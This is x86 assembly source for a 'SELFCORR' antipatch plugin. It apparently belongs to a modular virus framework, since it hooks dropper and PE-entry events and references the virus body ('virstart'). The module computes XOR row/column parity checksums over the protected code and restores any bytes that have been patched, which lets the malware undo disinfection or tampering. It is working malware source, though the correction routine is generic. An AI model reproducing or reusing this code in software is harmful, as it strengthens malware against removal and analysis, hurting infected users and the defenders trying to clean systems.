   ; SELFCORR
   ; ~~~~~~~~
   ; - antipatch tool
   ;     þ if csum-protected code has been patched at rel. addr X (0=virstart),
   ;       then N == maximal number of bytes to be restored correctly is
   ;       N = align(X, LINE_SIZE) - X

   LINE_SIZE               equ     32
   LINE_SIZE_LOG2          equ     5

   include                 INCLUDE\consts.inc
   include                 pentry.inc
   include                 dropper.inc
   include                 system.inc
   include                 memory.inc
   include                 unprot.inc

   include                 plugin.inc
                           PLUGIN_START    SELFCORR, CODE32, PERMUTABLE

   handleevent:            hookevent EV_SELFCORR_CSUM_GET_SIZE, _getsize
                           hookevent EV_SELFCORR_CSUM_CREATE, _create
                           hookevent EV_SELFCORR_RUN, _fix_in_pe
   ;                       hookevent EV_PENTRY_START_IN_PE, _fix_in_pe
   ;                       hookevent EV_DROPPER_START_ARC, _fix_in_pe
   ;                       hookevent EV_DROPPER_START_MAIN, _fix_in_pe
                           stc
                           retn

   _fix_in_pe:             pusha
                           event   EV_UNPROT_ME
                           event   EV_SYSTEM_GET_VIR_SIZE ; esi/ecx==vir
                           lea     edi, [esi+ecx]         ; edi=csum
                           call    _fix
                           ;;
                           call    _getsize        ; zerofill csum data
                           xor     eax, eax        ;
                           cld                     ;
                           rep     stosb           ;
                           ;;
                           popa
                           stc     ; unhandled (keep event)
                           retn

   ; i: ECX=data_size
   ; o: ECX=csum_size

   _getsize:               pusha
                           call    sc_getsize
                           mov     [esp].popa_ecx, ecx
                           popa
                           clc
                           retn

   ; input: ESI = data buffer ptr
   ;        ECX = data_size
   ;        EDI = csum buffer ptr

   _create:                pusha
                           call    sc_create
                           popa
                           clc
                           retn

   ; input: ESI = data buffer ptr
   ;        ECX = data_size
   ;        EDI = csum buffer ptr
   ; output:none

   _fix:                   pusha

                           call    sc_fix
                           jnz     __error

                           or      eax, eax
                           jz      __exit

                           event   EV_SELFCORR_FIX_SUCCESS

   __exit:                 popa
                           clc
                           retn

   __error:                event   EV_SELFCORR_FIX_ERROR
                           jmp     __exit

   ;----------------------------------------------------------------------------

   ; input:  ECX = data_size
   ; output: ECX = csum_size
   ;             = 4 + LINE_SIZE + (data_size + LINE_SIZE - 1) div LINE_SIZE

   sc_getsize:             add     ecx, LINE_SIZE-1
                           shr     ecx, LINE_SIZE_LOG2
                           add     ecx, 4+LINE_SIZE
                           retn

   ;----------------------------------------------------------------------------

   ; input:  ESI = data buffer ptr
   ;         ECX = data size
   ;         EDI = csum buffer ptr

   sc_create:              pusha
                           call    sc_getsize
                           xor     eax, eax
                           cld
                           rep     stosb
                           popa
                           call    sc_xor
                           pusha
                           call    sc_calchash
                           stosd
                           popa
                           retn

   ;----------------------------------------------------------------------------

   ; input:  ESI = data buffer ptr
   ;         ECX = data size
   ;         EDI = csum buffer ptr

   sc_xor:                 pusha
                           cld

                           scasd   ; skip hash

                           lea     edx, [edi + LINE_SIZE]

   __cycle_y:              xor     ebx, ebx
   __cycle_x:              lodsb
                           xor     [edi+ebx], al   ; y
                           xor     [edx], al       ; x
                           dec     ecx
                           jz      __exitcycle
                           inc     ebx
                           cmp     ebx, LINE_SIZE
                           jb      __cycle_x
                           inc     edx
                           jmp     __cycle_y

   __exitcycle:            popa
                           retn

   ; input:  ESI = data buffer ptr
   ;         ECX = data size
   ;         EDI = csum buffer ptr
   ; output: EAX = # of bytes changed
   ;         ZF==1 (JZ)  -- success
   ;         ZF==0 (JNZ) -- error

   sc_fix:                 pusha

                           xor     eax, eax
                           mov     [esp].popa_eax, eax

                           cmp     [edi], eax
                           jz      __quit          ; return success (no csum)

                           call    sc_calchash
                           cmp     eax, [edi]
                           jnz     __quit          ; return error

                           ;; make copy of the csum buffer (EDI)
                           pusha
                           mov     esi, edi
                           call    sc_getsize
                           event   EV_MEMORY_MALLOC
                           mov     edi, edx
                           rep     movsb
                           mov     [esp+32].pusha_edi, edx
                           mov     [esp].popa_edi, edx
                           popa
                           ;;

                           call    sc_xor

                           scasd                   ; skip hash

                           lea     edx, [edi + LINE_SIZE]

   __cycle_y:              xor     ebx, ebx

   __cycle_x:              mov     al, [edi+ebx]
                           mov     ah, [edx]

                           or      al, al
                           jz      __cont
                           or      ah, ah
                           jnz     __fix

   __cont:                 inc     esi

                           dec     ecx
                           jz      __exitcycle
                           inc     ebx
                           cmp     ebx, LINE_SIZE
                           jb      __cycle_x
                           inc     edx
                           jmp     __cycle_y

   __exitcycle:
                           mov     ecx, [esp].pusha_ecx
                           call    sc_getsize
                           mov     edi, [esp].pusha_edi
                           scasd             ; skip hash
                           sub     ecx, 4    ;
                           xor     eax, eax
                           cld
                           repz    scasb

                           ;; free copy of the csum buffer
                           pushf
                           mov     edx, [esp+4].pusha_edi
                           event   EV_MEMORY_MFREE
                           popf
                           ;;

   __quit:                 popa
                           retn

   __fix:                  xor     [esi], al
                           xor     [edi+ebx], al
                           xor     [edx], al

                           inc     [esp].popa_eax

                           jmp     __cont

   ;----------------------------------------------------------------------------

   ; input:  ECX = data size
   ;         EDI = csum buffer ptr
   ; output: EAX = csum buffer hash

   sc_calchash:            pusha
                           call    sc_getsize
                           and     cl, not 3  ; align 4
                           add     ecx, edi   ; ecx = lastbyte
                           scasd              ; skip hash
                           xor     eax, eax
   __cycle:                imul    eax, eax
                           sub     eax, [edi]
                           add     edi, 4
                           cmp     edi, ecx
                           jb      __cycle
                           mov     [esp].popa_eax, eax
                           popa
                           retn

   ;----------------------------------------------------------------------------

                           PLUGIN_END
